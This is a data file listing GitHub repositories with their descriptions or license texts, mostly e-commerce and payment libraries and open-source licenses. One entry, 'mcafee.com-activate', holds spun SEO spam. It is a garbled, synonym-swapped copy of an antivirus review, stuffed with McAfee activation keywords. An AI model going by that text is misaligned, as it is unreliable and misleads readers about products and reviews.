0,https://github.com/Agfress/CSGOKing.git,"This is free and unencumbered software released into the public domain.  Anyone is free to copy, modify, publish, use, compile, sell, or distribute this software, either in source code form or as a compiled binary, for any purpose, commercial or non-commercial, and by any means.  In jurisdictions that recognize copyright laws, the author or authors of this software dedicate any and all copyright interest in the software to the public domain. We make this dedication for the benefit of the public at large and to the detriment of our heirs and successors. We intend this dedication to be an overt act of relinquishment in perpetuity of all present and future rights to this software under copyright law.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.  For more information, please refer to <http://unlicense.org/>",,1
0,https://github.com/Pray4me1985/vigilant-barnacle.git,"MIT License  Copyright (c) [year] [fullname]  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the ""Software""), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.",,1
0,https://github.com/Luiskiing/License.git,"7-Zip   ~~~~~   License for use and distribution   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    7-Zip Copyright (C) 1999-2021 Igor Pavlov.    The licenses for files are:      1) 7z.dll:          - The ""GNU LGPL"" as main license for most of the code          - The ""GNU LGPL"" with ""unRAR license restriction"" for some code          - The ""BSD 3-clause License"" for some code     2) All other files: the ""GNU LGPL"".    Redistributions in binary form must reproduce related license information from this file.    Note:     You can use 7-Zip on any computer, including a computer in a commercial     organization. You don\'t need to register or pay for 7-Zip.     GNU LGPL information   --------------------      This library is free software; you can redistribute it and/or     modify it under the terms of the GNU Lesser General Public     License as published by the Free Software Foundation; either     version 2.1 of the License, or (at your option) any later version.      This library is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU     Lesser General Public License for more details.      You can receive a copy of the GNU Lesser General Public License from     http://www.gnu.org/       BSD 3-clause License   --------------------      The ""BSD 3-clause License"" is used for the code in 7z.dll that implements LZFSE data decompression.     That code was derived from the code in the ""LZFSE compression library"" developed by Apple Inc,     that also uses the ""BSD 3-clause License"":      ----     Copyright (c) 2015-2016, Apple Inc. All rights reserved.      Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:      1.  Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.      2.  Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer         in the documentation and/or other materials provided with the distribution.      3.  Neither the name of the copyright holder(s) nor the names of any contributors may be used to endorse or promote products derived         from this software without specific prior written permission.      THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT     LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE     COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES     (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)     HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)     ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.     ----       unRAR license restriction   -------------------------      The decompression engine for RAR archives was developed using source     code of unRAR program.     All copyrights to original unRAR code are owned by Alexander Roshal.      The license for original unRAR code has the following restriction:        The unRAR sources cannot be used to re-create the RAR compression algorithm,       which is proprietary. Distribution of modified unRAR sources in separate form       or as a part of other software is permitted, provided that it is clearly       stated in the documentation and source comments that the code may       not be used to develop a RAR (WinRAR) compatible archiver.     --   Igor Pavlov",,1
0,https://github.com/VishwasPrasanna/ALDA_Mobile_Money_Transaction_Fraud_Detection.git,"Detecting a fraudulent mobile money transaction is the focus of our work. As mobile transactions continue to increase, online fraud detection continues to become a bigger issue. Although fraud via smartphones is increasing at a faster pace than general PC/laptop based fraud, smartphones have the potential to become as secure a channel as the web through the use of advanced encryption and authentication technologies. By paying close attention to red flags and suspicious activities, you can avoid merchant services fraud. According to the 2018 Global fraud report, it is evident that out of the digital market place consumers 91% of customers use smartphone out of which 88% use for personal banking and it has been noted that 72% cite fraud as a growing concern over the past twelve months and 63% report higher level of fraudulent losses over that same period. One such activity is cited in the rise of Synthetic identities. Synthetic identities come from accounts not held by actual individuals, but by fabricated identities created to perpetuate fraud. These identities are created by combining the credentials and information of a mixed set of individuals to create a completely new ID. Criminals use this kind of technique to commit frauds in the area of healthcare, utility services and taxes. The research in the area of combatting such kind of frauds, motivates us to find a robust system to detect fraudulent transactions. Smartphones have been an easy target for fraudsters as it lacks the security level that other mobile devices have. Fraudsters know that it is generally easier to take over an account by phishing, spear phishing (targeting an individual) or Smishing (phishing via a mobile device), than to open a new account using a real or ‚Äòsynthetic‚Äô identity, which is why the risk of account takeover is one of the most alarming trends in fraud. ",,1
0,https://github.com/nickasyraf/nick.git,"INTEL LICENSE AGREEMENT IMPORTANT - READ BEFORE COPYING OR USING. Do not use or load this library and any associated materials (collectively, the ""Software"") until you have read the following terms and conditions. By loading or using the Software, you agree to the terms of this Agreement. If you do not wish to so agree, do not use the Software. LICENSE: Subject to the restrictions below, Intel Corporation (""Intel"") grants to you the permission to use, copy, distribute and prepare derivative works of this Software for any purpose and without fee, provided, that Intel\'s copyright notice appear in all copies of the Software files.The distribution of derivative works of the Software is also subject to the following limitations: you (i) are solely responsible to your customers for any liability which may arise from the distribution, (ii) do not make any statement that your product is ""certified"", or that its performance is guaranteed, by Intel, and (iii) do not use Intel\'s name or trademarks to market your product without written permission. EXCLUSION OF ALL WARRANTIES. The Software is provided ""AS IS"" without any express or implies warranty of any kind including warranties of merchantability, noninfringement, or fitness for a particular purpose. Intel does not warrant or assume responsibility for the accuracy or completeness of any information contained within the Software.As this Software is given free of charge, in no event shall Intel be liable for any damages whatsoever arising out of the use of or inability to use the Software, even if Intel has been adviced of the possibility of such damages. Intel does not assume any responsibility for any errors which may appear in this Software nor any responsibility to update it.",,1
0,https://github.com/Elathorn/EU4-Province-Mass-Editor.git,"#### WELCOME #### It\'s my first published program so I want to welcome you! I\'m very happy that you decided to use my program. It   should work without any problems.  ### ABOUT ###  EU4 Province Mass Editor is tool which is created for easy editing lot of history files for EU4 game. At the   moment it can change most of starting values.  ### HOW TO USE ### Before running program: Open EU4_provinces_location.txt and change directory for directory you want to modify. Commands usage: [command] [values] NULL [province IDs] 0 Examples: add_core TUR MAM NULL 5 6 0 - will add core for MAM and TUR in provinsed 5 and 6 culture swedish NULL 3 4 0 - will change culture in provines 3 and 4 to swedish add_estate clery NULL 3 0 - will add or change estate to clergy in prowince 3 Commands work like in provinces files so it should be intuitive. WARNING! Using commands unrecorded in file will result in inserting new lines before 5th line. If file is shorter   than 5 lines, it will add new lines at end of file.  ### POSSIBLE ERRORS ### Error: Can\'t open files location: (location here) Check EU4_provinces_location.txt and program permissions to read files.  Error: Can\'t open/save file (file here) Check if program has permissions to read/write files in given location.  ### AUTHOR INFO #### Kamil ""Elas"" Hliwa Contact: elathorn<at>gmail.com Please do not use my email for things like ""how to use this program"" or ""it doesn\'t work"" - use forum topic/PM   instead.  ### COPYRIGHTS ### Copyright (c) 2016 Kamil Hliwa  Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated   documentation files (the ""Software""), to deal in the Software without restriction, including without limitation   the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and   to permit persons to whom the Software is furnished to do so, subject to the following conditions:  The above copyright notice and this permission notice shall be included in all copies or substantial portions of   the Software.  THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO   THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF   CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS   IN THE SOFTWARE.",,1
0,https://github.com/nima0011/ni.git," notices to the program.  It is safest to attach them to the start of each source file to most effectively state the exclusion of warranty; and each file should have at least the ""copyright"" line and a pointer to where the full notice is found.      <one line to give the program\'s name and a brief idea of what it does.>     Copyright (C) <year>  <name of author>      This program is free software: you can redistribute it and/or modify     it under the terms of the GNU General Public License as published by     the Free Software Foundation, either version 3 of the License, or     (at your option) any later version.      This program is distributed in the hope that it will be useful,     but WITHOUT ANY WARRANTY; without even the implied warranty of     MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the     GNU General Public License for more details.      You should have received a copy of the GNU General Public License     along with this program.  If not, see <https://www.gnu.org/licenses/>.  Also add information on how to contact you by electronic and paper mail.    If the program does terminal interaction, make it output a short notice like this when it starts in an interactive mode:      <program>  Copyright (C) <year>  <name of author>     This program comes with ABSOLUTELY NO WARRANTY; for details type `show w\'.     This is free software, and you are welcome to redistribute it     under certain conditions; type `show c\' for details.  The hypothetical commands `show w\' and `show c\' should show the appropriate parts of the General Public License.  Of course, your program\'s commands might be different; for a GUI interface, you would use an ""about box"".    You should also get your employer (if you work as a programmer) or school, if any, to sign a ""copyright disclaimer"" for the program, if necessary. For more information on this, and how to apply and follow the GNU GPL, see <https://www.gnu.org/licenses/>.    The GNU General Public License does not permit incorporating your program into proprietary programs.  If your program is a subroutine library, you may consider it more useful to permit linking proprietary applications with the library.  If this is what you want to do, use the GNU Lesser General Public License instead of this License.  But first, please read <https://www.gnu.org/licenses/why-not-lgpl.html>.",,1
0,https://github.com/lilygrace454/mcafee.com-activate.git,"{""The Best Antivirus and Total Protection for Mac! What's the Best Malware Protection?   Malware, Spyware, and Adware Protection   Antivirus programming is basic for each PC. Without it, you hazard losing your own data, your records, and even the money from your financial balance. We've tried in excess of 40 utilities to enable you to pick the best antivirus security for your PCs.    Malware, Spyware, and Adware Protection    Summer is practically here, and we're all anticipating a stunning get-away, be it at the shoreline, in the mountains, or even on a journey. Malware coders get-aways, as well. Theirs is an occupation, similar to some other, from numerous points of view. In any case, that doesn't mean you'll be sheltered from infections, ransomware, bots, and other malware this late spring. The malware office director timetables get-aways, much the same as any office supervisor, to ensure someone's at work, making new assaults on your gadgets and your information. Before you head out, check your antivirus membership to ensure it won't take its very own get-away soon. In case you're not ensured at this point, put introducing an antivirus on your agenda. We've tried and McAfee com activate antivirus instruments so you can pick one and unwind with no stresses.    We call it antivirus, yet in truth it's far-fetched you'll get hit with a real PC infection. Malware nowadays is tied in with profiting, and there's no simple method to take advantage of spreading an infection. Ransomware and information taking Trojans are considerably more typical, as are bots that let the bot-herder lease your PC for loathsome purposes. Current antivirus utilities handle Trojans, rootkits, spyware, adware, ransomware, and that's only the tip of the iceberg. PCMag has explored in excess of 40 distinctive business antivirus utilities, and that is not notwithstanding checking the many free antivirus devices. Out of that broad field we've named fourEditors' Choice items.    mcafee activate product key  antivirus utilities demonstrated powerful enough to procure an astounding four-star rating nearby their progressively conventional partners. VoodooSoft VoodooShield puts together its security with respect to stifling every obscure program while the PC is in a powerless state, for example, when it's associated with the web, and furthermore acts to identify known malware. The Kure resets the PC to a known safe state on each reboot, consequently wiping out any malware. On the off chance that you have malware, one of the ten items in the graph above should deal with the issue.    You may see that one item in the outline earned simply 3.5 stars. The diagram had space for one more, and of the seven 3.5-star items, the labs just focus on F-Secure and G Data. F-Secure has the additional fillip of costing the equivalent for three licenses as most items charge for only one, so it advanced into the diagram. The blurbs at the base of this article incorporate each business antivirus that earned 3.5 stars or better.    www.mcafee.com/activate offer insurance past the antivirus incorporated with Windows 10; the best free antivirus utilities additionally offer more. In any case, Microsoft Windows Defender Security Center is looking somewhat better recently, with some awesome scores from free testing labs. In our grasp on tests, it demonstrated a checked improvement since our past audit, enough to at long last bring it up to three stars.    Tune in to the Labs    We take the outcomes announced by free antivirus testing labs in all respects truly. The basic reality that a specific merchant's item appears in the outcomes is a demonstration of positive support, of sorts. It implies the lab considered the item huge, and the merchant felt the expense of testing was advantageous. Obviously, getting great scores in the tests is additionally significant.    We pursue four labs that normally discharge nitty gritty reports: SE Labs, AV-Test Institute, MRG-Effitas, and AV-Comparatives. We likewise note whether sellers have contracted with ICSA Labs and West Coast labs for affirmation.    We Test Malware, Spyware, and Adware Defenses We additionally subject each item to our very own hands-on trial of malware assurance, to a limited extent to get an inclination for how the item functions. Contingent upon how altogether the item averts malware establishment, it can acquire up to 10 for malware assurance.    Our malware assurance test fundamentally utilizes a similar arrangement of tests for quite a long time. To check an item's treatment of fresh out of the box new malware, we test every item utilizing 100 amazingly new malware-facilitating URLs provided by MRG-Effitas, taking note of what level of them it blocked. Items get equivalent kudos for anticipating all entrance to the vindictive URL and for clearing out the malware during download.    A few items win completely outstanding evaluations from the autonomous labs, yet don't toll too in our grasp on tests. In such cases, we concede to the labs, as they carry altogether more prominent assets to their testing. Need to know more? You can dive in for a point by point portrayal of how we test security programming.    Multilayered Malware Protection    Antivirus items separate themselves by going past the fundamentals of on-request examining and ongoing malware insurance. Some rate URLs that you visit or that appear in indexed lists, utilizing a red-yellow-green shading coding framework. Some effectively square procedures on your framework from associating with known malware-facilitating URLs or with false (phishing) pages.    Programming has imperfections, and here and there those blemishes influence your mcafee security. Judicious clients keep Windows and all projects fixed, fixing those imperfections at the earliest opportunity. The defenselessness output offered by some antivirus items can check that every vital patches are available, and even apply any that are absent.    Spyware comes in numerous structures, from concealed projects that log your each keystroke to Trojans that take on the appearance of legitimate projects while mining your own information. Any antivirus should deal with spyware, alongside every other sort of malware, yet some incorporate specific segments gave to spyware insurance.    You expect an antivirus to recognize and dispose of terrible projects, and to disregard great projects. Shouldn't something be said about questions, programs it can't distinguish as positive or negative? Conduct based discovery can, in principle, secure you against malware that is so new scientists have never experienced it. In any case, this isn't generally an unmixed gift. It's normal for social discovery frameworks to hail numerous harmless practices performed by genuine projects.    Whitelisting is another way to deal with the issue of obscure projects. A whitelist-based security framework just permits realized great projects to run. Questions are prohibited. This mode sometimes falls short for all circumstances, however it very well may be helpful. Sandboxing gives obscure projects a chance to run, however it segregates them from full access to your framework, so they can't do lasting damage. These different added layers serve to upgrade your assurance against malware.    What's the Best Malware Protection?    mcafee.com/activate antivirus would it be advisable for you to pick? You have an abundance of choices. Kaspersky Anti-Virus and Bitdefender Antivirus Plus routinely take impeccable or close ideal scores from the autonomous antivirus testing labs. A solitary membership for AntiVirus Plus gives you a chance to introduce security on the majority of your Windows, Android, Mac OS, and iOS gadgets. What's more, its unordinary conduct based recognition innovation implies Webroot SecureAnywhere Antivirus is the most diminutive antivirus around. We've named these four Editors' Choice for business antivirus, however they're by all account not the only items worth thought. Peruse the surveys of our top of the line items, and afterward settle on your own choice.    Note that we have assessed a lot more antivirus utilities than we could incorporate into the diagram of top items. On the off chance that your preferred programming isn't recorded there, odds are we reviewed it. The blurbs beneath incorporate each item that oversaw 3.5 stars or better. Every one of the utilities recorded in this component are Windows antivirus applications. In case you're a macOS client, don't lose hope, be that as it may; PCMag has a different gathering devoted exclusively to the best Mac antivirus programming.""}",,1
0,https://github.com/activemerchant/active_merchant.git,Active Merchant is a simple payment abstraction library extracted from Shopify. The aim of the project is to feel natural to Ruby users and to abstract as many parts as possible away from the user to offer a consistent interface across all supported gateways.,,4308
0,https://github.com/greggles/mcc-codes.git,A public repository of Merchant Category Codes (MCC) in formats easier to read than most places (i.e. not a PDF),,351
0,https://github.com/osCommerce/oscommerce.git,osCommerce Online Merchant v3.x,,309
0,https://github.com/flyerhzm/activemerchant_patch_for_china.git,"A rails plugin to add an active_merchant patch for china online payment platform including alipay (ÊîØ‰ªòÂÆù), 99bill (Âø´Èí±) and tenpay (Ë¥¢‰ªòÈÄö)",,308
0,https://github.com/osCommerce/oscommerce2.git,osCommerce Online Merchant v2.x,,272
0,https://github.com/Shopify/active_fulfillment.git,Active Merchant library for integration with order fulfillment services,ruby,148
0,https://github.com/alexk111/awesome-bitcoin-payment-processors.git,"üåü A curated list of Bitcoin payment processors enabling merchants, businesses and nonprofits to accept Bitcoin payments.","awesome-lists,bitcoin,payment-processing,awesome-list,awesome,bitcoin-payment,payment-processors,lightning,lightning-network,btc",147
0,https://github.com/abantecart/abantecart-src.git,"AbanteCart is a free PHP based eCommerce solution for merchants to provide ability creating online business and sell products online quick and efficient.  AbanteCart application is built and supported by experienced enthusiasts that are passionate about their work and contribution to rapidly evolving eCommerce industry. AbanteCart is more than just a shopping cart, it is rapidly growing eCommerce platform",,124
0,https://github.com/xucongli1989/XCLCMS.git,"XCLCMS is a lightweight CMS (content management system) background management system, Developed using asp.net MVC, it provides a simple and easy-to-use web API interface and supports multiple applications for a single merchant.","cms,xclcms,webapi,asp-net,asp-net-mvc,asp-net-web-api,dotnet,content-management-system",106
0,https://github.com/jpablobr/active_paypal_adaptive_payment.git,PayPal Adaptive Payments for Active Merchant,,85
0,https://github.com/opengento/magento2-gdpr.git,"Magento 2 GDPR module is a must have extension for the largest e-commerce CMS used in the world. The module helps to be GDPR compliant. Actually it allows the customers to erase, or export their personal data. As a merchant you have powerful tools to customize the extension capabilities and apply the finest privacy rules.","magento2,rgpd,gdpr,privacy,magento2-module,magento2-extension,magento-2,magento-2-extension,anonymization,erasure,magento",82
0,https://github.com/magento-hackathon/E-MailPreview.git,This extension enables the merchants and developers to preview mail templates from the backend with real data.,,81
0,https://github.com/Shopify/active_utils.git,"Active Utils extracts commonly used modules and classes used by Active Merchant, Active Shipping, and Active Fulfillment",,81
0,https://github.com/tomdale/apple-pay-merchant-session-server.git,Server for obtaining Apple Pay for the Web merchant sessions,,78
0,https://github.com/blockchain/Android-Merchant-App.git,Blockchain Android Merchant App,,74
0,https://github.com/samotari/crypto-terminal.git,CryptoTerminal is an open-source terminal application with which merchants can accept in-person cryptocurrency payments.,,74
0,https://github.com/sbuss/bitmerchant.git,Bitcoin merchant tools,,70
0,https://github.com/railsdog/spree-paypal-express.git,"allowing use of paypal express in spree, using (a modified version of) active merchant",,64
0,https://github.com/ceph/dmclock.git,"Code that implements the dmclock distributed quality of service algorithm. See ""mClock: Handling Throughput Variability for Hypervisor IO Scheduling"" by Gulati, Merchant, and Varman.",,63
0,https://github.com/aasisvinayak/flymyshop.git,FlyMyShop : A free open source e-commerce platform for online merchants ,"laravel,shopping-cart,ecommerce,shop,php,stripe,worldpay",59
0,https://github.com/vitalybaev/php-google-merchant-feed.git,"PHP package, that generates Google Merchant XML Feed","php,google-merchant",49
0,https://github.com/bitmash/alipay-api-php.git,A concise library in PHP for the Alipay API merchant account.,"alipay,php,payment",47
0,https://github.com/xwaynec/active_merchant_allpay.git,"This plugin is an active_merchant patch forAllpay(Ê≠ê‰ªòÂØ∂) online payment in Taiwan. Now it supports Credit card(‰ø°Áî®Âç°), ATM(ËôõÊì¨ATM) and CVS(Ë∂ÖÂïÜÁπ≥Ë≤ª).",,44
0,https://github.com/ericblade/mws-advanced.git,"{""Javascript (node) Amazon Merchant Web Services (MWS) code with mws-simple as it's underpinnings""}","mws,amazon-api,javascript,market,promise,amazon-mws,node,node-js,nodejs,hacktoberfest,mws-api,mws-libraries",43
0,https://github.com/Xenland/BIK_php.git,"{""Don't trust online wallets for your Point of sale device or merchant store? Manage your own Bitcoins finacials with out being a financial programming computer security expert with this library at your side. php""}",,40
0,https://github.com/opencart-ukraine/translate.git,OpenCart is a free open source ecommerce platform for online merchants. OpenCart provides a professional and reliable foundation from which to build a successful online store.,,39
0,https://github.com/commercetools/merchant-center-application-kit.git,Tools and components for developing Merchant Center Applications üõ†,"javascript,frontend,react,toolkit,audit-frontend",35
0,https://github.com/shopwareDowntown/downtown.git,"With our portal, we want to support local authorities and merchants. We want to connect merchants with closed stores to their customers. And we want to keep in mind, that not every merchant has a sophisticated digital strategy - or even a homepage.","ecommerce,covid-19,shopware,php,mysql",31
0,https://github.com/husseyexplores/poshify-utilities.git,Some posh utilities for Shopify developers and merchants packaged as a browser extension üéâ,,29
0,https://github.com/helmutschneider/swish-php.git,PHP-wrapper for the Swish merchant api,,28
0,https://github.com/magento-hackathon/magento2-toolbar.git,Toolbar with developer and merchant functionality,,27
0,https://github.com/cryptonator/merchant-api-sdk-php.git,Merchant API SDK for PHP,,25
0,https://github.com/spesmilo/electrum-merchant.git,configuration script for merchant website,,24
0,https://github.com/oxyum/django-payment-webmoney.git,WebMoney Merchant Interface support for Django. ,,23
0,https://github.com/PrestaShop/mailalerts.git,Sends e-mail notifications to customers and merchants in PrestaShop 1.6.,"prestashop-module,prestashop-1-6,obsolete",22
0,https://github.com/RazerMS/Seamless_Integration.git,Razer Merchant Services Seamless Integration,"molpay,molpay-seamless,javascript,payment",22
0,https://github.com/PrestaShop/ps_emailalerts.git,Sends e-mail notifications to customers and merchants regarding stock and order modifications.,"prestashop-module,prestashop-1-7,prestashop",21
0,https://github.com/dexlab-io/dexpay-pos.git,"Dexpay: POS, a modularized and extensible point of sale which enables Merchants to accept payments in ETH, DAI and xDAI.","ethereum-dapp,ethereum,dai,xdai,point-of-sale,solidity-contracts",21
0,https://github.com/devfacet/amazon-costs.git,A module for retrieving Amazon product information and calculating costs for fulfillment and merchant channels,"amazon,costs,fulfillment,merchants,fba,fbm",21
0,https://github.com/cardmagic/payment.git,An easy to use payment gateway for Ruby. Payment is used to process credit cards and electronic cash through merchant accounts like Authorize.Net.,,21
0,https://github.com/smrealms/smr.git,Space Merchant Realms open-source game engine,"mmo,pbbg,space-game,docker,mysql,foss,php8",20
0,https://github.com/RickardPettersson/swish-api-csharp.git,Swish For Merchant API Client .Net Standard Library,,20
0,https://github.com/sebastyuiop/spree_google_merchant.git,Live product feed for Google Merchant,,19
0,https://github.com/SirWaithaka/simple-mpesa.git,"A simple example of how MPESA works. Works with all 3 types of customers i.e. Agents, Merchants and Subscribers. Allows you to configure a tariff and apply it to transactions. The project follows DDD principles.","domain-driven-design,gorm,docker,postgres,ports-and-adapters,golang,gofiber,rest-api,transfer-money,transaction,repository-pattern,wallet-service,wallet,wallet-api,mobile-money",19
0,https://github.com/jverhoelen/fabric-composer-engine-supplychain.git,"Hyperledger Fabric & Composer example that models a consortium of car engine manufacturers, merchants and customers.","hyperledger-fabric,hyperledger-composer,hyperledger,blockchain",18
0,https://github.com/maciejzgadzaj/commerce_marketplace.git,Drupal module package providing overrides for default Drupal Commerce behaviors allowing to use DC-based store as a multiple-merchant marketplace.,,18
0,https://github.com/orweinberger/bitcoin-merchant-api.git,A self hosted REST API for Bitcoin merchants,,17
0,https://github.com/osCommerce/languages.git,Languages for osCommerce Online Merchant v3.x,,17
0,https://github.com/NascentSecureTech/pix-qrcode-utils.git,Parser and Generator for EMV Merchant QR Codes,,17
0,https://github.com/Nets-mobile-acceptance/Netaxept-Sample-Backend.git,The PiA merchant sample backend is a reference implementation of a merchant backend interacting with PiA sample Android and iOS applications and Netaxept.,,17
0,https://github.com/tfitts/spree_google_merchant.git,Updated Google Merchant XML Generator based on spree-google-base,,16
0,https://github.com/samlown/active_merchant_sermepa.git,Active Merchant extension for the Spanish Sermepa payment gateways,,16
0,https://github.com/mageplaza/all-free-extensions.git,"The Top Magento 2 Extensions by Mageplaza comes with a bulk of amazing features that allow the merchants to do more on their online stores via the richness of the categories including Sales and Motivations, Content Management, even User Experience, etc.","magento2-extension-free,magento2-free-extension,magento2-free-modules",16
0,https://github.com/btcpayserver/directory.btcpayserver.org.git,"BTCPay Server Directory - Merchants, Projects & Charities accepting Bitcoin",btcpayserver,15
0,https://github.com/hiqdev/yii2-merchant.git,Payment merchants extension for Yii2,"yii2,omnipay,payum,hacktoberfest",15
0,https://github.com/bayetech/cmb_pay.git,An unofficial cmb (China Merchants Bank ‰∏≠ÂõΩÊãõÂïÜÈì∂Ë°å) pay gem.,"payment-gateway,payment-integration,china-merchants-bank",15
0,https://github.com/bestpredicts/ELO.git,Elo Merchant Category Recommendation 21th solution,,15
0,https://github.com/RazerMS/rms-mobile-xdk-android.git,Razer Merchant Services mobile payment for Android (Android Studio),,15
0,https://github.com/Invictusintl/coinbase-commerce-whmcs.git,A simple WHMCS gateway that uses the new Coinbase Commerce merchant tools https://commerce.coinbase.com/,,15
0,https://github.com/ebanx/benjamin.git,:electric_plug: EBANX business rule abstraction layer for merchant sites and e-commerce platform plugins.,owner-dev-merchant-product,15
0,https://github.com/khalti/khalti-sdk-ios.git,Khalti SDK for iOS apps.  Khalti Merchant can use this library to integrate the payment system in their system.,"sdk,ios,payment-gateway-in-nepal,khalti,khalti-sdk",15
0,https://github.com/FeeFighters/samurai-client-ruby.git,"If you are an online merchant and using samurai.feefighers.com, this gem will make your life easy. Signup at https://samurai.feefighers.com/ and start processing transactions.",,15
0,https://github.com/facebookincubator/facebook-for-magento2.git,"* Pixel on all pages, which trigger events link, PageView, ViewContent, AddToCart, Initiatecheckout and Purchase.* In the background, Syncs the products from the merchants product catalog to Facebook Catalog.* Stores all the data, like pixel id, catalog id, business maanger id, on to the local database on the instance.",,15
0,https://github.com/magenest-dev/module-popup.git,Magento 2 Popup Extension lets merchants create rich popups for their webstore quickly with our plethora of editable pre-designed templates.,,15
0,https://github.com/click-llc/click-integration-php.git,"This library allows you to integrate payment acceptance using ""CLICK"" payment system into PHP web applications. For the library to function properly, the user must be connected to Click Merchant using the Shop API scheme.","php,php-integration,click,click-shopping-api,click-merchant-api,uzbekistan,clickuz,uz",15
0,https://github.com/fdyuandong/2D-3D-Point-Set-Registration-Based-on-Global-Rotation-Search.git,"# 2D-3D Point Set Registration Based on Global Rotation Search # Copyright (C) 2018 Yinlong Liu@outlook.com # # This program is free software; you can redistribute it and/or modify # it under the terms of the GNU General Public License as published by # the Free Software Foundation; either version 2 of the License, or # (at your option) any later version. # # This program is distributed in the hope that it will be useful, # but WITHOUT ANY WARRANTY; without even the implied warranty of # MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the # GNU General Public License for more details. # # Any publications resulting from the use of this code should cite the # following paper: # Yinlong Liu, Yuan Dong, Zhijian Song and Manning Wang, ""2D 3D Point Set Registration Based on Global Rotation_Search"", IEEE Transactions on Image Processing (TIP)  # # #==================Note================= # #1. First step->open demo_rot.m. It is a demo of Rotation Search in SO(3) for 2D-3D point set registration. # #2. The input data is set to a real circumstance that 3D point set is far away for projection plane, and in front of camera.  Our method also can be applied to unusual condition that camera is surrounded by 3D point set, only if you make some fix.  # #3. RotaionSearch.m is the kernel of algorithm. You can easily extend it to SE(3) searching by grid-search, while tuning parameters depends on your tasks. # #4. Fast and Global 2D-3D point set registration without correspondence is still an open problem and need further explorations. I am very happy that if you could benefit from our code. # # # Author: Yinlong Liu # Date: 20181218 # Revision: 1.0",,15
0,https://github.com/bKash-developer/pgw-merchant-backend-php.git,Demo merchant back-end for bKash pgw integration in php,"php,bkash-pgw",14
0,https://github.com/Jaliborc/Scrap.git,Sells all your junk when you visit a merchant,"lua,world-of-warcraft,addon,inventory,automation",14
0,https://github.com/markroland/converge-api-php.git,A PHP class that acts as wrapper for the Converge (formerly Virtual Merchant) API,,14
0,https://github.com/shirsig/aux_merchant_prices.git,"Install like a regular addon, folder name must be aux_merchant_prices.",,14
0,https://github.com/click-llc/android-msdk.git,"This library allows you to embed payment acceptance using ""Click"" into Android mobile applications. For the library to function properly, the user must be connected to Click Merchant using the Shop API scheme","sdk-android,click,android-sdk,uzbekistan,clickuz,msdk,mobilesdk,click-sdk,clicksdk",14
0,https://github.com/bitcoin-sv-specs/brfc-merchantapi.git,Merchant API Specification,,13
0,https://github.com/rakchaev/tinkoff-merchant-api.git,Tinkoff Merchant API,,13
0,https://github.com/kancart/OpenCart-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for OpenCart (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,13
